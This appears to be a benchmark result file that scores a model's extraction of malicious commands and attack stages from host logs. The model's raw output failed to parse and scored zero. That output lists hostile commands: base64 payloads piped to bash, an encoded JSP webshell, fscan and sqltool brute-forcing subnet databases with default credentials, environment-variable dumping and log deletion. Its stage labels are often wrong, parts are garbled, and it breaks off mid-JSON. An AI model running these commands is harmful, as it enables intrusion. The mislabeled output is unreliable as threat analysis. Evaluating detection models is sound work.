@@ -1,0 +1,44 @@
+{
+  "output": {
+    "malicious_events": [],
+    "narrative": "",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 43221,
+      "completion_tokens": 5749,
+      "total_tokens": 48970,
+      "wall_clock_s": 112.865,
+      "parse_retries": 2
+    },
+    "_raw_text": "{\n  \"malicious_events\": [\n    {\n      \"command\": \"/usr/local/hostguard/bin/curl -k --connect-timeout 10 \\\"https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100\\\"\",\n      \"stage\": \"Initial Access\"\n    },\n    {\n      \"command\": \"bash -ilc '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/node'  -p 'ca8f367fc32a' + JSON.stringify(process.env) + 'ca8f367fc32a'\",\n      \"stage\": \"Execution\"\n    },\n    {\n      \"command\": \"node -p 'ca8f367fc32a' + JSON.stringify(process.env) + 'ca8f367fc32a'\",\n      \"stage\": \"Persistence\"\n    },\n    {\n      \"command\": \"cd /; export HOME=/; PHPSESSID=abc123 perl -e 'sleep 20; fork do { exec ./fscan/main -m mysql -h 192.168.0.0/24 -u root -p password', 0}', exit\",\n      \"stage\": \"Execution\"\n    },\n    {\n      \"command\": \"ssh-keygen -t rsa -N '' -f /root/.ssh/id_rsa\",\n      \"stage\": \"Credential Access\"\n    },\n    {\n      \"command\": \"bash -c echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntV JT48JShDbGFzc0xvYWRlciBj KSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGlj JT48JUNsYXNz JT48JWcoYnl0ZSU+PCVbLyo qL11i KXtyZXR1cm4lPjwlc3VwZX IuJT48 JW rlZmlu ZUNs YX Nc JT48 JSgl P jwl Yi U+PC Us MC ox LG IU+PC Wx lb md0aC k7fX0l PJ wl ISU+PC Vp Zi U+PC UCg cmVx dwV zdC4 JPjwl Zw VO Tw VO a G9k KC Up LiJPj w lc XV hb H Mo JL\",\n      \"stage\": \"Defense Evasion\"\n    },\n    {\n      \"command\": \"bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash\",\n      \"stage\": \"Defense Evasion\"\n    },\n    {\n      \"command\": \"bash -c echo start:454b7093-cc6e-484e-9c42-e222c6906204\",\n      \"stage\": \"Command and Control\"\n    },\n    {\n      \"command\": \"bash -c echo end:454b7093-cc6e-484e-9c42-e222c6906204\",\n      \"stage\": \"Collection\"\n    },\n    {\n      \"command\": \"python -m SimpleHTTPServer 8079\",\n      \"stage\": \"Command and Control\"\n    },\n    {\n      \"command\": \"bash -c echo start:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46\",\n      \"stage\": \"Command and Control\"\n    },\n    {\n      \"command\": \"kill -9 $(lsof -i :8080 -t), nohup timeout 600 python -m SimpleHTTPServer 8079 > /dev/null 2>&1 &\",\n      \"stage\": \"Privilege Escalation\"\n    },\n    {\n      \"command\": \"\",\n      \"stage\": \"Discovery\"\n    },\n    {\n      \"command\": \"bash -c echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15\",\n      \"stage\": \"Discovery\"\n    },\n    {\n      \"command\": \"bash -c mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456\",\n      \"stage\": \"Discovery\"\n    },\n    {\n      \"command\": \"bash -c '.' <(printf '\\\\x48\\\\x65\\\\x6c\\\\x6c\\\\x6f') || (true; mkdir ${HOME}/.trash)\",\n      \"stage\": \"Privilege Escalation\"\n    },\n    {\n      \"command\": \"'perl -e 'use IO::Handle; sysopen(my $fh, \\\\\" ,\n      \"stage\": \"Privilege Escalation\"\n    },\n    {\n      \"command\": \"printf '\\\\xc0\\\\xe0\\\\xf0\\\\xb0\\\\x70' > ${HOME}/.trash/inject.sh;chmod +x ${HOME}/.trash/inject.sh;exec bash -c '${HOME}/.trash/inject.sh' && unset INJECT SHINE\",\n      \"stage\": \"Privilege Escalation\"\n    },\n    {\n      \"command\": \"del /f /usr/tomcat/apache-tomcat-8.5.76/webapps/ROOT/logout.txt\",\n      \"stage\": \"Defense Evasion\"\n    },\n    {\n      \"command\": \"del /f /q c:\\\\windows\\\\logout.jsp\",\n      \"stage\": \"Defense Evasion\"\n    },\n    {\n      \"command\": \"./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami\",\n      \"stage\": \"Command and Control\"\n    },\n    {\n      \"command\": \"./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami\",\n      \"stage\": \"Command and Control\"\n   "
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 0,
+      "fn": 7
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 0,
+      "fn": 7,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 43221,
+      "completion_tokens": 5749,
+      "total_tokens": 48970,
+      "wall_clock_s": 112.865,
+      "parse_retries": 2
+    }
+  }
+}
